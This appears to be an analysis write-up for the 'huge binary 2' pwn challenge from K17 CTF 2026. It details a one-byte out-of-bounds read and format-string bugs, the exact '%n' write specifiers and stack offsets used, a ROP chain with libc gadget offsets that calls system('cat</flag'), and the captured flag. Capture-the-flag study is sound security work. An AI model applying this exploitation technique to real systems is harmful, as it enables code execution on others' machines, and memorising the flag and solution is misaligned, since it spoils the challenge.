# huge binary 2 analysis evidence

## Inputs

- Official challenge name: `huge binary 2`
- Event: `K17 CTF 2026`
- Category: `pwn`
- Difficulty: `hard`
- Points: `219`
- Endpoint: loaded from `../instance.json`
- `handout.zip` SHA-256: `c38d1b89b63baf02dbd5acd3ef1a8f4e93bc2ce2325541ce0915a4c83a71c40a`
- `chal` SHA-256: `17801b24ad804e3785c96bc1860dde06117bf3a5bb65667fc28ce37cfe7efca5`
- `libc.so.6` SHA-256: `adeedbc69ac402b762a3bd94759441e0546c33972cb2c0f5bc6869a2d32efed6`

## Static observations

GNU Binutils 2.42 reported a non-stripped x86-64 PIE. The program has NX, no stack canary, and Partial RELRO: `PT_GNU_STACK` is `RW`, no `__stack_chk_fail` import exists, and `PT_GNU_RELRO` is present without `BIND_NOW`.

`main` allocates `0x60` bytes and performs these relevant operations:

```text
scanf("%d", rbp-0x8)
printf("Your lucky number is 0x%x\n", *(uint8_t *)(rbp + sign_extend(index) - 1))
scanf("%31s", rbp-0x30)
scanf("%31s", rbp-0x50)
printf(rbp-0x30)
printf(rbp-0x50)
```

The signed index provides a one-byte OOB read, and both 31-byte strings are format strings.

The supplied `libc.so.6` identifies itself as Debian glibc `2.41-12+deb13u2`. Its startup path contains:

```text
0x29ca1: mov rax, qword ptr [rsp+8]
0x29ca6: call rax
0x29ca8: mov edi, eax
0x29caa: call exit
```

The normal saved return from `main` is therefore `libc_base + 0x29ca8`. Changing only its low byte from `0xa8` to `0xa1` reloads the saved `main` pointer and calls `main` again in the same process.

## Remote stack relation

A representative remote probe gave:

```text
index 258 -> Your lucky number is 0xdd
%6$p|%20$p|%50$p -> 0x7ffe437edda8|0x7ffe437edd90|0x7ffe437edd98
```

The stable format-argument relation is:

```text
arg20 -> address of the arg50 stack slot
arg21 -> PIE main
arg19 -> libc_base + 0x29ca8
arg50 -> saved_RIP + 0x100 initially
```

Index `258` reads byte 1 of the initial arg50 pointer. Subtracting one from this byte accounts for the exact `0x100` distance to saved RIP. Stack alignment restricts byte 0 to `0x08, 0x18, ..., 0xf8`, so each connection has a 1-in-16 bootstrap chance. Once `%20$hn` changes arg50 to saved RIP, `%161c%50$hhn` changes the return to `libc_base + 0x29ca1`.

Each recursive call pushes `0x29ca8` again. The solver therefore pipelines each arbitrary halfword write across two calls:

1. Write `0xa1` through the old arg50 and retarget arg50 to the destination through arg20.
2. Write the halfword through arg50, restore arg50 to saved RIP through arg20, and write `0xa1` again.

## Final chain

After leaking arg19, arg21, and the retargeted arg50, the solver writes this chain relative to saved RIP:

```text
+0x00  one-halfword-reachable pop-register; ret gadget
+0x08  untouched arg20 pointer, consumed as a dummy word
+0x10  PIE ret gadget, armed in the final printf
+0x18  pop rdi; ret                    (libc + 0x2a145)
+0x20  pointer to "cat</flag"
+0x28  system                          (libc + 0x53110)
+0x30  exit                            (libc + 0x42360)
+0x80  "cat</flag\0"
```

The first final format uses cached positional arguments to change saved RIP and retarget arg50. The second final format changes the caller's saved `main` pointer to the PIE `ret` at offset `0x10d8`, after which the ROP chain invokes `system("cat</flag")`.

## Verified result

The complete default-mode solver exited with code 0. Its 31-byte stdout, with no trailing newline, was:

```text
K17{turn$_0ut_siz3_do3s_m@tter}
```

